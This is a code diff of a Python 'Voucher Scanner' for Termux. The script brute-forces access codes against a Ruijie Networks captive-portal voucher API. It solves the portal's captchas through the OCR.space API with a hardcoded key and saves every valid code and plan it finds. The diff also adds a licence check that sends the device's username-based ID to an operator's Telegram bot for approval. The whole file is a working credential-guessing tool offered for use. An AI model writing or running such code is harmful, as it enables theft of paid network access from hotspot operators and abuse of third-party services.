@@ -126,27 +126,19 @@ def print_progress(checked, total=None, speed=0, found=0, target=None, mode=None
 
 # ── Captcha handling (Modified: Removed ddddocr/cv2) ──────────────────
 async def Captcha_Text(image_bytes):
-    """
-    Solve captcha using OCR.space API (Free).
-    Note: Requires an internet connection and an API key.
-    For local use on Termux, this is much lighter than cv2/ddddocr.
-    """
     try:
-        # Simple preprocessing with Pillow if needed
         img = Image.open(BytesIO(image_bytes))
-        img = img.convert('L') # Grayscale
+        img = img.convert('L')
         buffered = BytesIO()
         img.save(buffered, format="PNG")
         
-        # Using OCR.space Free API
-        # You can get your own key at https://ocr.space/ocrapi
-        api_key = 'K81684333688957' # This is a public demo key, better to use a private one
+        api_key = 'K81684333688957'
         payload = {
             'apikey': api_key,
             'language': 'eng',
             'isOverlayRequired': False,
             'base64Image': f"data:image/png;base64,{base64.b64encode(buffered.getvalue()).decode()}",
-            'OCREngine': 2 # Engine 2 is better for captchas
+            'OCREngine': 2
         }
         
         async with aiohttp.ClientSession() as session:
@@ -154,11 +146,9 @@ async def Captcha_Text(image_bytes):
                 result = await resp.json()
                 if result.get('ParsedResults'):
                     text = result['ParsedResults'][0].get('ParsedText', '').strip()
-                    # Clean up the text (remove spaces, special chars)
                     text = re.sub(r'[^A-Za-z0-9]', '', text)
                     return text.upper()
-    except Exception as e:
-        # print(f"OCR Error: {e}")
+    except:
         pass
     return None
 
@@ -236,7 +226,6 @@ async def get_balance(session_id):
     try:
         async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
             data = await resp.json()
-            # Simplified logic to get balance
             for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'balance']:
                 if key in data: return _parse_minutes(data[key])
             if 'result' in data:
@@ -249,17 +238,14 @@ async def get_balance(session_id):
 async def perform_check(session_url, code, plan_filters=None):
     global stop_scan
     if stop_scan: return None
-
     post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
-    
     for attempt in range(3):
         if stop_scan: return None
         async with aiohttp.ClientSession() as task_session:
             session_id = await get_session_id(task_session, session_url)
             if not session_id: continue
-            
             auth_code = None
-            for _ in range(5): # Reduced attempts for speed
+            for _ in range(5):
                 try:
                     image = await Captcha_Image(task_session, session_id)
                     text = await Captcha_Text(image)
@@ -268,9 +254,7 @@ async def perform_check(session_url, code, plan_filters=None):
                         auth_code = text
                         break
                 except: continue
-            
             if not auth_code: continue
-            
             data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
             async with task_session.post(post_url, json=data) as resp:
                 res_data = await resp.json()
@@ -284,33 +268,122 @@ async def run_bruteforce(mode, session_url, target=None, plan_filters=None):
     checked = 0
     found = 0
     start_time = time.monotonic()
-    
     print(f"\n🚀 Scanning started... Mode: {mode}")
-    
     async with aiohttp.ClientSession() as session_obj:
         for code in iter_codes(mode):
             if stop_scan: break
-            
             result = await perform_check(session_url, code, plan_filters)
             checked += 1
-            
             if result:
                 found += 1
                 success_texts.append(result)
                 with open("found_codes.txt", "a") as f:
                     f.write(f"{result['code']} | Plan: {result['plan']}\n")
                 print(f"\n✨ FOUND: {result['code']} | Plan: {result['plan']}")
-                
                 if target and found >= target:
                     print(f"\n🎯 Target reached: {found} codes found.")
                     break
-            
             elapsed = time.monotonic() - start_time
             speed = (checked / elapsed) * 60 if elapsed > 0 else 0
             print_progress(checked, speed=speed, found=found, target=target, mode=mode)
-            
     scan_running = False
     print("\n✅ Scan finished.")
+
+# ── License System ──────────────────────────────────────────────────
+def get_device_id():
+    id_file = DEVICE_ID_FILE
+    if os.path.exists(id_file):
+        try:
+            with open(id_file, "r") as f: return f.read().strip()
+        except: pass
+    try:
+        result = subprocess.check_output("whoami", shell=True, encoding='utf-8')
+        device_id = result.strip()
+        if device_id:
+            clean_id = re.sub(r'[^A-Za-z0-9]', '', device_id).upper()
+            clean_id = (clean_id[:6] if len(clean_id) >= 6 else clean_id.ljust(6, 'X'))
+            new_id = f"STR-{clean_id}"
+            with open(id_file, "w") as f: f.write(new_id)
+            return new_id
+    except: pass
+    random_id = "STR-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+    with open(id_file, "w") as f: f.write(random_id)
+    return random_id
+
+def format_remaining(remaining):
+    if remaining is None: return "Unknown"
+    days = remaining.days
+    hours = remaining.seconds // 3600
+    minutes = (remaining.seconds % 3600) // 60
+    if days > 0: return f"{days}d {hours}h"
+    elif hours > 0: return f"{hours}h {minutes}m"
+    else: return f"{minutes}m"
+
+def get_license_status():
+    if not os.path.exists(LICENSE_FILE): return None, None, None, None
+    try:
+        with open(LICENSE_FILE, "r") as f:
+            data = f.read().strip().split("|")
+            if len(data) != 2: return None, None, None, None
+            key, exp_ts = data
+            exp_dt = datetime.fromtimestamp(float(exp_ts))
+            now = datetime.now()
+            if now < exp_dt: return True, key, exp_dt, exp_dt - now
+            else: return False, key, exp_dt, None
+    except: return None, None, None, None
+
+def save_license(key, days):
+    exp_dt = datetime.now() + timedelta(days=days)
+    with open(LICENSE_FILE, "w") as f: f.write(f"{key}|{exp_dt.timestamp()}")
+    return exp_dt
+
+def send_telegram_message(text):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
+    try: requests.post(url, json=payload, timeout=5)
+    except: pass
+
+def get_updates(offset=None):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
+    params = {"timeout": 10, "offset": offset} if offset else {"timeout": 10}
+    try:
+        resp = requests.get(url, params=params, timeout=12)
+        if resp.status_code == 200: return resp.json().get("result", [])
+    except: pass
+    return []
+
+def request_license_via_telegram(user_key):
+    device_id = get_device_id()
+    msg = f"🔑 *License Request*\n📱 Device: `{device_id}`\n🔐 Key: `{user_key}`\n\nReply: `/allow {user_key} <days>`"
+    send_telegram_message(msg)
+    print("\033[1;36m[*] Request sent to Telegram. Waiting for admin approval...\033[0m")
+    last_update_id = None
+    start = time.time()
+    while time.time() - start < 120:
+        updates = get_updates(offset=last_update_id)
+        for update in updates:
+            last_update_id = update.get("update_id") + 1
+            msg_obj = update.get("message")
+            if msg_obj and str(msg_obj.get("chat", {}).get("id")) == TELEGRAM_CHAT_ID:
+                text = msg_obj.get("text", "").strip()
+                match = re.match(rf"^/allow\s+{re.escape(user_key)}\s+(\d+)$", text, re.I)
+                if match:
+                    days = int(match.group(1))
+                    exp_dt = save_license(user_key, days)
+                    send_telegram_message(f"✅ License granted for `{user_key}`.")
+                    return True
+        time.sleep(2)
+    return False
+
+def ensure_license():
+    valid, key, exp_dt, remaining = get_license_status()
+    if valid is True:
+        print(f"\033[1;32m[+] License Active! Expires in: {format_remaining(remaining)}\033[0m")
+        return True
+    print(f"\033[1;33m[*] No valid license found. Please enter your key.\033[0m")
+    user_key = input(f"\033[1;32m[>] Enter License Key: \033[0m").strip()
+    if not user_key: return False
+    return request_license_via_telegram(user_key)
 
 def show_help():
     print("\n" + "=" * 50)
@@ -327,22 +400,23 @@ def show_help():
 async def main():
     global scan_running, stop_scan
     print("\n🤖 Voucher Scanner for Termux (Lightweight)")
-    print("📌 Type 'help' for commands")
     
+    if not await asyncio.to_thread(ensure_license):
+        print("❌ License check failed.")
+        return
+
+    print("📌 Type 'help' for commands")
     while True:
         try:
             cmd = await asyncio.to_thread(input, "\n> ")
             cmd = cmd.strip().lower()
             if not cmd: continue
-            
             parts = cmd.split()
             command = parts[0]
-            
             if command in ["exit", "quit"]:
                 stop_scan = True
                 break
-            elif command == "help":
-                show_help()
+            elif command == "help": show_help()
             elif command == "setup":
                 if len(parts) < 2: print("Usage: setup <url>")
                 else:
@@ -369,10 +443,8 @@ async def main():
                     print(f"{i}. {res['code']} | {res['plan']}")
             elif command == "status":
                 print(f"Running: {scan_running}, Found: {len(success_texts)}")
-        except KeyboardInterrupt:
-            break
-        except Exception as e:
-            print(f"Error: {e}")
+        except KeyboardInterrupt: break
+        except Exception as e: print(f"Error: {e}")
 
 if __name__ == "__main__":
     asyncio.run(main())
